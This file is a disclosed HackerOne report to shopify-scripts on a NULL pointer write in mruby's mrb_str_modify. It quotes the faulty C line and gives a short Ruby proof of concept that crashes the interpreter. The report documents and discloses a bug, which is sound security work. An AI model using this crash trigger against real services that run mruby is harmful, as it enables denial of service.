@@ -1,0 +1,27 @@
+ReportLink:https://hackerone.com/reports/197723
+WeaknessName:Denial of Service
+Reporter:https://hackerone.com/marotagem_vrt
+ReportedTo:shopify-scripts(shopify-scripts)
+BountyAmount:800.0
+Severity:low
+State:Closed
+DateOfDisclosure:07.02.2017 6:28:59
+
+Summary:
+
+The function  mrb_str_modify doesn't check if s->as.heap.ptr is NULL before operating in it.
+
+Attempt to write to a NULL pointer happens here:
+```
+676	      RSTR_PTR(s)[s->as.heap.len] = '\0';
+```
+
+Poc:
+```ruby
+a = String.new
+a[0]
+GC.start()
+a.upcase!
+```
+
+Version tested: https://github.com/mruby/mruby/blob/e1ff71029f95e3274136263adbdc51c662ec52de/src/string.c
